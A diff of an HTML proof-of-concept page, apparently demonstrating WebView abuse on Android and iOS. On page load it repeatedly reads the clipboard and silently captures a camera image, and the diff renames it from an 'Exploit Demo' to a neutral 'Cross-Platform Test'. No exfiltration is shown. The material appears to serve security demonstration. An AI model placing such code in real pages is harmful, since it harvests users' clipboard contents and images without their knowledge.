@@ -1,43 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Android WebView Security Abuse</title>
+    <title>Cross-Platform Test</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        .hidden { display: none; }
         body { font-family: sans-serif; padding: 20px; }
+        .hidden { display: none; }
         .section { margin-bottom: 20px; }
     </style>
 </head>
 <body onload="initiateExploits();">
-    <h1>🚨 Android WebView Exploit Demo</h1>
+    <h1>🔓 WebView Security (Android + iOS)</h1>
 
     <div class="section">
-        <h3>Clipboard Data:</h3>
-        <div id="clipboardData" style="border: 1px dashed #ccc; padding: 10px; min-height: 50px;"></div>
+        <h3>📋 Clipboard Data:</h3>
+        <div id="clipboardData" style="border: 1px dashed #999; padding: 10px; min-height: 50px;"></div>
     </div>
 
     <div class="section">
-        <h3>Captured Camera Image:</h3>
+        <h3>📷 Captured Camera Image:</h3>
         <video id="videoPreview" class="hidden" autoplay playsinline></video>
         <img id="capturedImage" class="hidden" />
     </div>
 
     <script>
         function getClipboardData() {
-            if (!navigator.clipboard || !navigator.clipboard.readText) {
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                setInterval(() => {
+                    navigator.clipboard.readText().then(text => {
+                        if (text) {
+                            document.getElementById('clipboardData').textContent = text;
+                        }
+                    }).catch(err => {
+                        console.warn("Clipboard blocked:", err.message);
+                    });
+                }, 2000);
+            } else {
                 console.warn("Clipboard API not available");
-                return;
             }
-            setInterval(() => {
-                navigator.clipboard.readText().then(text => {
-                    if (text) {
-                        document.getElementById('clipboardData').textContent = text;
-                    }
-                }).catch(err => {
-                    console.error("Clipboard read failed", err);
-                });
-            }, 1000);
         }
 
         function requestCameraAccess() {
@@ -50,21 +50,21 @@
                     setTimeout(() => {
                         captureImage(video, img);
                         stream.getTracks().forEach(track => track.stop());
-                    }, 3000);
+                    }, 4000);
                 }).catch(err => {
-                    console.error("Camera access error:", err);
+                    console.error("Camera access denied:", err.message);
                 });
             }
         }
 
-        function captureImage(videoElement, imgElement) {
+        function captureImage(video, img) {
             const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-            imgElement.src = canvas.toDataURL('image/png');
-            imgElement.classList.remove('hidden');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            img.src = canvas.toDataURL('image/png');
+            img.classList.remove('hidden');
         }
 
         function initiateExploits() {
